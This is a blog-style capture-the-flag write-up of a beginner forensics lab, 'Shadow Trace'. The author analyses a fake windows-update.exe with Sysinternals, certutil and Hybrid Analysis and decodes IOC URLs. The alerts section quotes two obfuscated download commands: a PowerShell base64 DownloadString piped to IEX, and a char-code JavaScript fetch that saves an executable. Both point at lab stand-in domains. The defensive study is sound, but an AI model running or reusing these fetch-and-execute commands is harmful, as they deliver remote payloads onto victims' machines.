<h1 align="center">Challenge 042 - Shadow Trace </h1>
<div align="center">
  <img src="https://github.com/user-attachments/assets/a0bd8e0b-737b-481c-8791-1e4eead01af4"width="90" height="90" />
</div>
<br>
<p align="center"> <b>Difficulty</b>: 1/10 (Very Easy) <b>Completed</b>: ✔️ 14.10.2025  </p>

In this CTF we will have to analyze a suspicious file, uncover hidden clues, and trace the source of the infection. A lot of blue teaming is expected from us this time around and I will have to work with tools I'm not that familiar with, but I hope this experience will be valuable nonetheless.

A binary is given to us, which is located at C:\\Users\DFIRUser\Desktop\windows-update.exe of our attached machine. The tools that can help us with different kinds of analysis are located at C:\Users\DFIRUser\DFIR Tools.

## File Analysis

Now the first task we are given is to find out is what the architecture of the binary file windows-update.exe is. I thought we would work with Linux, which is why I was pretty disappointed when I suddenly saw the Windows OS. I knew one or two useful commands on the terminal, but now I truly know nothing.

After some research I decided to use the 'sigcheck' tool from Sysinternals to determine the architecture.

```
C:\Users\DFIRUser>cd DFIR Tools

C:\Users\DFIRUser\DFIR Tools>cd SysinternalSuite
The system cannot find the path specified.

C:\Users\DFIRUser\DFIR Tools>cd SysinternalsSuite

C:\Users\DFIRUser\DFIR Tools\SysinternalsSuite>.\sigcheck64.exe \Users\DFIRUser\Desktop\windows-update.exe

Sigcheck v2.90 - File version and signature viewer
Copyright (C) 2004-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\users\dfiruser\desktop\windows-update.exe:
        Verified:       Unsigned
        Link date:      3:13 AM 10/3/2025
        Publisher:      n/a
        Company:        n/a
        Description:    n/a
        Product:        n/a
        Prod version:   n/a
        File version:   n/a
        MachineType:    64-bit
```

That worked quite well. The machine type seems to be 64-bit. 

Now we have to find out the hash (sha-256) of the windows-update.exe file. For that I navigated to the Desktop and ran the following command

```
C:\Users\DFIRUser\Desktop>certutil -hashfile windows-update.exe SHA256
SHA256 hash of windows-update.exe:
b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc
CertUtil: -hashfile command completed successfully.
```

The 'certutil -hashfile' command is a built-in utility in Windows that calculates the hash value of a specified file. We could also generate hash values such as MD5, SHA-1, or like in this instance SHA-256.
Keep that command in mind if you ever want to calulcate hash values in Windows.

Moving on, we are asked to identify the URL within the file to use it as an IOC (Indicator of Compromise), a piece of forensic data that identifies potential malicious activity on a system. It can include file hashes, IP addresses, URLs and domain names associated with malware or attacks.

I just copied the hash value and inserted it into the Hybrid Analysis site, a service which gives us the opportunity to analyze potential malware.

<img width="1845" height="696" alt="Bildschirmfoto vom 2025-10-14 18-45-14" src="https://github.com/user-attachments/assets/47452988-7c73-4195-9ebd-cbb9a75643ec" />

And from the extracted strings, which we could probably also work out ourselves with some kind of strings tool, we can see that a specific URL is being mentioned.

While further browsing through the extracted strings, there also was another suspicious domain that I found

```
tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
```

This looked like base64 encoding so I just made a quick check to make sure I was right.

<img width="316" height="494" alt="Bildschirmfoto vom 2025-10-14 18-58-09" src="https://github.com/user-attachments/assets/eb27eff1-5a57-4ed9-ae02-db95bc76f6ea" />

And I was. This didn't help in answering the prior question, where we needed to find another domain that could be used as an IOC. After checking all strings though, one string really stood out.

<img width="622" height="336" alt="Bildschirmfoto vom 2025-10-14 19-01-43" src="https://github.com/user-attachments/assets/b40e00ec-2325-48c5-bf97-f6a7a05f62ca" />

And with that we managed to find the domain name. Sweet. The very last thing we still have to figure out is what library related to socket communication is loaded by the binary. I just further kept on checking strings that might give a clue on what library could have been used. Something like 'ws2_32.dll' and while not even intentional it turned out to be the exact library I was referencing, that was being used.

<img width="625" height="550" alt="image" src="https://github.com/user-attachments/assets/c3d85fc8-6b24-4388-885c-9de5a92c563c" />

What a coincidence. But alas, if we just filter to a Dynamic Link Library (dll), we are bound to find something. Just keep stuff like that in mind, whenever we have to solve a task like that again.

## Alerts Analysis

Now for this second task we are expected to check a static site and identify some malicious URLs

<img width="953" height="832" alt="image" src="https://github.com/user-attachments/assets/fdac2196-d6bb-44aa-a410-b7ae34506865" />

Shadow Trace is a forensic analysis tool designed to track and analyze network communications. With this we should be able to trace back the source of malicious communications and provide insights into how threats propagate within a network. We should be able to examine captured packets this way and correlating them with known indicators of compromise (IOCs).

To start with we are asked to identify the malicious URL from the trigger by the process powershell.exe. When we just focus on the command itself and read what is being spelled out, we can figure out pretty quickly that the command

```
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;
```

means that this PowerShell command decodes a Base64-encoded URL and downloads the content from it using the System.Net.WebClient class.

We just copy the base64 encoding and see what URL we receive. 

<img width="347" height="502" alt="Bildschirmfoto vom 2025-10-14 19-42-34" src="https://github.com/user-attachments/assets/56683f6a-0979-4f4d-818d-f49dd90f3260" />

After having inserted that URL successfully we check out the second command, which while also obfuscated, reveals a lot by just analyzing the command itself

```
fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join('')).then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='test.txt';document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);});
```

We can easily see that an array of decimal values, which when converted to character values reveals the real URL

<img width="823" height="710" alt="Bildschirmfoto vom 2025-10-14 19-50-04" src="https://github.com/user-attachments/assets/980eb1d8-af19-4a83-a243-c899ba3f816e" />

So basically the fetch() method downloads a file from the given remote URL and the rest of the code gets executed

```
.then(r => r.blob())
.then(b => {
  const u = URL.createObjectURL(b);
  const a = document.createElement('a');
  a.href = u;
  a.download = 'test.txt';
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(u);
});
```

which converts the response (update.exe) into a binary blob, creates a temporary download link for it and sets the download filename to test.txt. It programmatically clicks the link -- triggering a download and cleaning up the temporary URL after the fact.

This was a very valuable lesson on how SOC operations might work and not only analyzing network traffic, but also malware. Figuring out how to work with Windows tools, was especially difficult for me, but I liked going through this experience. Hopefully this first experience will guide me in future situations, where I might have to operate in SIEM.
